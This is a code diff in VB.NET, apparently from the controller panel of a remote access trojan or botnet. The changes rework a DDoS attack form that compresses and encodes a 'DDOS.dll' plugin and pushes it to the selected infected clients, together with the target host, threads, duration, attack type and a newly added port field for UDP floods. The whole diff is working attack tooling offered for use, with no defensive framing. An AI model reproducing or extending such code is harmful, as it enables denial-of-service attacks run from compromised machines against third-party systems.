@@ -12,21 +12,22 @@
                         Flood_Host.Enabled = False
                         Flood_Threads.Enabled = False
                         Flood_Time.Enabled = False
-                        Flood_Type.Enabled = False
-
+                        Flood_Attack.Enabled = False
+                        Flood_Port.Enabled = False
                         For Each x As ListViewItem In Main.L1.SelectedItems
-                            Main.S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "1" + "|'P'|" + Flood_Host.Text + "|'P'|" + Flood_Threads.Text + "|'P'|" + Flood_Time.Text + "|'P'|" + " ")
+                            Main.S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "1" + "|'P'|" + Flood_Host.Text + "|'P'|" + Flood_Threads.Text + "|'P'|" + Flood_Time.Text + "|'P'|" + Flood_Port.Text)
                         Next
                     Else
                         MetroTile1.Text = "Please Wait.."
                         For Each x As ListViewItem In Main.L1.SelectedItems
-                            Main.S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "2")
+                            Main.S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "2")
                         Next
                         MetroTile1.Text = "Start Attack"
-                        Flood_Host.Enabled = Enabled
-                        Flood_Threads.Enabled = Enabled
-                        Flood_Time.Enabled = Enabled
-                        Flood_Type.Enabled = Enabled
+                        Flood_Host.Enabled = True
+                        Flood_Threads.Enabled = True
+                        Flood_Time.Enabled = True
+                        Flood_Attack.Enabled = True
+                        Flood_Port.Enabled = True
                     End If
                 End If
             Else
@@ -43,4 +44,13 @@
         e.Cancel = True
     End Sub
 
+    Private Sub Flood_Attack_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Flood_Attack.SelectedIndexChanged
+        If Flood_Attack.Text = "UDP" Then
+            MetroLabel3.Visible = True
+            Flood_Port.Visible = True
+        Else
+            MetroLabel3.Visible = False
+            Flood_Port.Visible = False
+        End If
+    End Sub
 End Class
